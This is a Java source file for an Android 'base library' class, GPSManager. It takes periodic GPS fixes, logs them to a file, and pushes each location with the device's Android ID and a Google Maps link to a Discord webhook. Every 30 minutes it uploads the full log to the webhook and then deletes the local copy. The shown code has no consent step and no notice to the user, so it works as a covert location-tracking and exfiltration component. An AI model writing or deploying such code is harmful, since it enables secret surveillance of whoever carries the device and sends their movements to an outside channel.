package com.application.baselibrary.core.location;

import android.content.Context;
import android.location.Location;
import android.provider.Settings;
import android.util.Log;


import com.application.baselibrary.data.LibraryConstants;
import com.application.baselibrary.network.DiscordWebhookClient;
import com.application.baselibrary.network.OkHttpClientHelper;
import com.application.baselibrary.threading.scheduler.RxSchedulerProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * GPSManager
 * ----------
 * High-level manager for GPS tracking, logging, and Discord reporting.
 */
public class GPSManager {

    private static final String TAG = "GPSManager";

    private final Context context;
    private final GpsTracker gpsTracker;
    private final String webhookUrl;
    private final String fileName = LibraryConstants.FILE_NAME_GPS_LOGS;

    public GPSManager(Context context, String webhookUrl) {
        this.context = context.getApplicationContext();
        this.gpsTracker = new GpsTracker(context);
        this.webhookUrl = webhookUrl;
    }

    public void start(String intervalTag){
        RxSchedulerProvider.runOnIO(() -> {
            Location location = gpsTracker.getLocationSync(15);
            if (location != null) {
                logLocation(location);
                pushLocationToDiscord(location);
                if (intervalTag.equals("Every30min")){
                    uploadLogFileToDiscord();
                }
            } else {
                Log.w(TAG, "No location fix after timeout "+intervalTag);
            }
        });
    }


    /** Save location to log file */
    private void logLocation(Location location) {
        String logEntry = String.format("Lat: %f, Lon: %f, Time: %d\n",
                location.getLatitude(), location.getLongitude(), System.currentTimeMillis());
        try (FileOutputStream fos = context.openFileOutput(fileName, Context.MODE_APPEND)) {
            fos.write(logEntry.getBytes());
        } catch (IOException e) {
            Log.e(TAG, "Error writing GPS log: " + e.getMessage());
        }
    }

    /** Push current location to Discord */
    private void pushLocationToDiscord(Location location) {
        if (webhookUrl == null || webhookUrl.isEmpty()) return;

        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        String mapsUrl = String.format("https://www.google.com/maps?q=%f,%f",
                location.getLatitude(), location.getLongitude());
        String currentTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());

        String content = String.format("📍 **Live Location Update**\nDevice: %s\nTime: %s\nLat: %f\nLon: %f\nMaps: %s",
                androidId, currentTime, location.getLatitude(), location.getLongitude(), mapsUrl);

        new DiscordWebhookClient(webhookUrl).sendMessage(content);
        Log.i(TAG, "Live location pushed to Discord.");
    }

    /** Upload GPS log file to Discord */
    private void uploadLogFileToDiscord() {
        File gpsFile = new File(context.getFilesDir(), fileName);
        if (!gpsFile.exists() || gpsFile.length() == 0) {
            Log.w(TAG, "GPS log file empty or missing. Skipping upload.");
            return;
        }

        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        String message = "📂 **GPS Log File Upload**\nDevice: " + androidId;

        new DiscordWebhookClient(webhookUrl).uploadFile(gpsFile, message, new DiscordWebhookClient.WebhookCallback() {
            @Override
            public void onSuccess(DiscordWebhookClient.WebhookResponse response) {
                Log.i(TAG, "GPS log file uploaded successfully.");
                gpsFile.delete();
            }

            @Override
            public void onError(String errorMessage) {
                Log.e(TAG, "GPS log file upload failed: " + errorMessage);
            }
        });
    }
}
